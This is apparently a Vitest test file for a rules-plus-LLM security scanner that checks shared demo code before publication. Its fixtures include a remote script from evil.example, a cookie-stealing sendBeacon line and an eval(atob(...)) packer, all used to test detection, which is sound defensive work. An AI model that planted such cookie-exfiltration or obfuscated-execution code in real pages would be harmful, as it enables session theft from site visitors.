import { describe, expect, it, vi } from "vitest";
import {
  decidePublishAllowed,
  reviewSharedBattleCode,
  type AiBinding,
} from "./code-security";
import {
  ESCALATION_MODEL,
  PRIMARY_MODEL,
  needsEscalation,
  parseLlmSecurityReport,
  truncateCodeForLlm,
} from "./code-security-llm";
import { rulesAloneBlock, scanCodeWithRules } from "./code-security-rules";

describe("scanCodeWithRules", () => {
  it("returns clean for ordinary demo markup", () => {
    const scan = scanCodeWithRules(
      `<!doctype html><html><body><h1>Hello</h1><script>console.log("hi")</script></body></html>`,
    );
    expect(scan.findings).toHaveLength(0);
    expect(scan.risk).toBe(0);
    expect(rulesAloneBlock(scan)).toBe(false);
  });

  it("flags eval and remote scripts as critical and hard-blocks", () => {
    const scan = scanCodeWithRules(
      `<script src="https://evil.example/x.js"></script><script>eval(userInput)</script>`,
    );
    expect(scan.findings.some((f) => f.type === "dynamic_execution")).toBe(true);
    expect(scan.findings.some((f) => f.type === "remote_script_loading")).toBe(
      true,
    );
    expect(rulesAloneBlock(scan)).toBe(true);
  });

  it("flags document.cookie theft patterns", () => {
    const scan = scanCodeWithRules(
      `const c = document.cookie; navigator.sendBeacon("https://x", c);`,
    );
    expect(scan.findings.some((f) => f.severity === "critical")).toBe(true);
    expect(rulesAloneBlock(scan)).toBe(true);
  });

  it("does not hard-block mere fetch usage", () => {
    const scan = scanCodeWithRules(
      `fetch("/api/demo").then(r => r.json()).then(console.log)`,
    );
    expect(scan.findings.some((f) => f.type === "data_exfiltration")).toBe(true);
    expect(rulesAloneBlock(scan)).toBe(false);
  });

  it("detects eval(atob(...)) packer pattern", () => {
    const scan = scanCodeWithRules(`eval(atob("YWxlcnQoMSk="))`);
    expect(
      scan.findings.some(
        (f) => f.type === "obfuscated_execution" && f.severity === "critical",
      ),
    ).toBe(true);
    expect(rulesAloneBlock(scan)).toBe(true);
  });
});

describe("LLM report parsing and escalation", () => {
  it("parses JSON object responses", () => {
    const report = parseLlmSecurityReport(
      {
        response: JSON.stringify({
          verdict: "safe",
          risk: 5,
          confidence: 0.9,
          findings: [],
          summary: "Clean demo",
        }),
      },
      PRIMARY_MODEL,
    );
    expect(report.verdict).toBe("safe");
    expect(report.confidence).toBe(0.9);
    expect(report.summary).toContain("Clean");
  });

  it("falls back to uncertain on garbage", () => {
    const report = parseLlmSecurityReport("not json at all", PRIMARY_MODEL);
    expect(report.verdict).toBe("uncertain");
    expect(report.confidence).toBe(0);
  });

  it("escalates on uncertain or low confidence", () => {
    expect(
      needsEscalation({
        verdict: "uncertain",
        risk: 0,
        confidence: 1,
        findings: [],
        summary: "",
        model: PRIMARY_MODEL,
      }),
    ).toBe(true);
    expect(
      needsEscalation({
        verdict: "safe",
        risk: 0,
        confidence: 0.5,
        findings: [],
        summary: "",
        model: PRIMARY_MODEL,
      }),
    ).toBe(true);
    expect(
      needsEscalation({
        verdict: "safe",
        risk: 0,
        confidence: 0.9,
        findings: [],
        summary: "",
        model: PRIMARY_MODEL,
      }),
    ).toBe(false);
  });

  it("truncates oversized code for the model", () => {
    const long = "a".repeat(50_000);
    const cut = truncateCodeForLlm(long, 1000);
    expect(cut.length).toBeLessThan(long.length);
    expect(cut).toContain("truncated");
  });
});

describe("decidePublishAllowed", () => {
  it("blocks on critical deterministic findings alone", () => {
    const decision = decidePublishAllowed(
      [
        {
          type: "dynamic_execution",
          severity: "critical",
          evidence: "eval(",
          explanation: "eval",
          source: "rules",
        },
      ],
      90,
      null,
    );
    expect(decision.allowed).toBe(false);
  });

  it("allows soft rule findings when AI is unavailable", () => {
    const decision = decidePublishAllowed(
      [
        {
          type: "data_exfiltration",
          severity: "medium",
          evidence: "fetch(",
          explanation: "network",
          source: "rules",
        },
      ],
      25,
      null,
    );
    expect(decision.allowed).toBe(true);
  });

  it("blocks malicious LLM with high confidence and high findings", () => {
    const decision = decidePublishAllowed([], 0, {
      verdict: "malicious",
      confidence: 0.92,
      risk: 85,
      findings: [
        {
          type: "credential_theft",
          severity: "critical",
          evidence: "document.cookie",
          explanation: "steals cookies",
        },
      ],
    });
    expect(decision.allowed).toBe(false);
  });

  it("does not block low-confidence malicious without rule corroboration", () => {
    const decision = decidePublishAllowed([], 0, {
      verdict: "malicious",
      confidence: 0.5,
      risk: 70,
      findings: [
        {
          type: "unknown",
          severity: "medium",
          evidence: "x",
          explanation: "maybe",
        },
      ],
    });
    expect(decision.allowed).toBe(true);
  });

  it("blocks suspicious LLM when rules also fire medium/high", () => {
    const decision = decidePublishAllowed(
      [
        {
          type: "data_exfiltration",
          severity: "medium",
          evidence: "fetch(",
          explanation: "network",
          source: "rules",
        },
      ],
      25,
      {
        verdict: "suspicious",
        confidence: 0.88,
        risk: 55,
        findings: [],
      },
    );
    expect(decision.allowed).toBe(false);
  });
});

describe("reviewSharedBattleCode", () => {
  it("allows clean code without AI", async () => {
    const review = await reviewSharedBattleCode(
      [{ label: "Model", code: "<p>Hello</p>" }],
      null,
    );
    expect(review.allowed).toBe(true);
    expect(review.llmSkipped).toBe(true);
  });

  it("hard-blocks critical patterns without calling AI", async () => {
    const ai: AiBinding = {
      run: vi.fn(async () => {
        throw new Error("should not be called");
      }),
    };
    const review = await reviewSharedBattleCode(
      [{ label: "Bad", code: "eval(atob('YQ=='))" }],
      ai,
    );
    expect(review.allowed).toBe(false);
    expect(review.llmSkipped).toBe(true);
    expect(ai.run).not.toHaveBeenCalled();
  });

  it("uses Qwen and skips escalation when confident", async () => {
    const ai: AiBinding = {
      run: vi.fn(async (model: string) => {
        if (model === PRIMARY_MODEL) {
          return {
            response: JSON.stringify({
              verdict: "safe",
              risk: 0,
              confidence: 0.95,
              findings: [],
              summary: "Fine",
            }),
          };
        }
        throw new Error(`unexpected model ${model}`);
      }),
    };

    const review = await reviewSharedBattleCode(
      [{ label: "Ok", code: "<button>Click</button>" }],
      ai,
    );
    expect(review.allowed).toBe(true);
    expect(review.models).toEqual([PRIMARY_MODEL]);
    expect(ai.run).toHaveBeenCalledTimes(1);
  });

  it("escalates and can block via LLM+rules dual signal", async () => {
    const ai: AiBinding = {
      run: vi.fn(async (model: string) => {
        if (model === PRIMARY_MODEL) {
          return {
            response: JSON.stringify({
              verdict: "uncertain",
              risk: 50,
              confidence: 0.3,
              findings: [],
              summary: "unsure",
            }),
          };
        }
        return {
          response: JSON.stringify({
            verdict: "suspicious",
            risk: 60,
            confidence: 0.9,
            findings: [
              {
                type: "data_exfiltration",
                severity: "high",
                evidence: "fetch(",
                explanation: "sends data out",
              },
            ],
            summary: "exfil risk",
          }),
        };
      }),
    };

    const review = await reviewSharedBattleCode(
      [{ label: "Net", code: `fetch("https://example.com/log", {method:"POST", body: "hi"})` }],
      ai,
    );

    expect(review.models).toEqual([PRIMARY_MODEL, ESCALATION_MODEL]);
    expect(review.allowed).toBe(false);
    expect(ai.run).toHaveBeenCalledTimes(2);
  });

  it("fails open on AI errors when rules do not hard-block", async () => {
    const ai: AiBinding = {
      run: vi.fn(async () => {
        throw new Error("AI down");
      }),
    };
    const review = await reviewSharedBattleCode(
      [{ label: "Ok", code: "<div>demo</div>" }],
      ai,
    );
    expect(review.allowed).toBe(true);
    expect(review.llmSkipped).toBe(true);
  });
});
